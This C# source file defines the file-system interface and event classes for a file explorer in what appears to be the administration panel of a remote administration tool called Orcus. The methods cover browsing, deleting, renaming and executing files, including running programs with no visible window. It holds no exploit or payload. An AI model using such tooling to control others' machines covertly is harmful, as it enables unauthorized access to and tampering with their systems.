using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Orcus.Shared.Commands.FileExplorer;

namespace Orcus.Administration.ViewModels.CommandViewModels.FileExplorer
{
    public interface IFileSystem
    {
        Task<List<PackedDirectoryEntry>> GetDirectories(DirectoryEntry directory);
        Task<List<PackedDirectoryEntry>> GetDirectories(DirectoryEntry directory, bool ignoreCache);
        Task<PathContent> RequestPathContent(string path);
        Task<PathContent> RequestPathContent(string path, bool ignoreCache);
        Task<PathContent> RequestPathContent(string path, bool ignoreCache, bool pathIgnoreCache);

        Task<EntryDeletionFailed> Remove(IFileExplorerEntry fileExplorerEntry);
        Task<List<EntryDeletionFailed>> Remove(IEnumerable<IFileExplorerEntry> fileExplorerEntries);
        Task Rename(IFileExplorerEntry fileExplorerEntry, string newName);
        Task CreateFolder(string folderPath);
        Task CreateShortcut(string path, ShortcutInfo shortcutInfo);
        Task ExecuteFile(string path, string arguments, string verb, bool createNoWindow);

        ImageProvider ImageProvider { get; }

        event EventHandler<IFileExplorerEntry> FileExplorerEntryRemoved;
        event EventHandler<EntryRenamedInfo> FileExplorerEntryRenamed;
        event EventHandler<EntryAddedInfo> FileExplorerEntryAdded;
        event EventHandler<DirectoryEntriesUpdate> DirectoryEntriesUpdated;
    }

    public class EntryAddedInfo : EventArgs
    {
        public EntryAddedInfo(IFileExplorerEntry addedEntry, string path)
        {
            AddedEntry = addedEntry;
            Path = path;
        }

        public IFileExplorerEntry AddedEntry { get; }
        public string Path { get;  }
    }


    public class EntryRenamedInfo : EventArgs
    {
        public EntryRenamedInfo(IFileExplorerEntry fileExplorerEntry, string newName, string newPath)
        {
            FileExplorerEntry = fileExplorerEntry;
            NewName = newName;
            NewPath = newPath;
        }

        public IFileExplorerEntry FileExplorerEntry { get; }
        public string NewName { get; }
        public string NewPath { get; }
    }

    public class EntryDeletionFailed
    {
        public EntryDeletionFailed(string errorMessage, IFileExplorerEntry entry)
        {
            ErrorMessage = errorMessage;
            Entry = entry;
        }

        public string ErrorMessage { get; }
        public IFileExplorerEntry Entry { get; }
    }

    public class PathContent
    {
        public PathContent(DirectoryEntry directory, List<IFileExplorerEntry> entries, List<DirectoryEntry> pathParts)
        {
            Directory = directory;
            Path = directory.Path;
            Entries = entries;
            PathParts = pathParts;
        }

        public DirectoryEntry Directory { get; }
        public string Path { get;}
        public List<IFileExplorerEntry> Entries { get; }
        public List<DirectoryEntry> PathParts { get; }
    }

    public class DirectoryEntriesUpdate : EventArgs
    {
        public DirectoryEntriesUpdate(string directoryPath, List<IFileExplorerEntry> entries, bool directoriesOnly)
        {
            DirectoryPath = directoryPath;
            Entries = entries;
            DirectoriesOnly = directoriesOnly;
        }

        public string DirectoryPath { get; }
        public List<IFileExplorerEntry> Entries { get; }
        public bool DirectoriesOnly { get; }
    }
}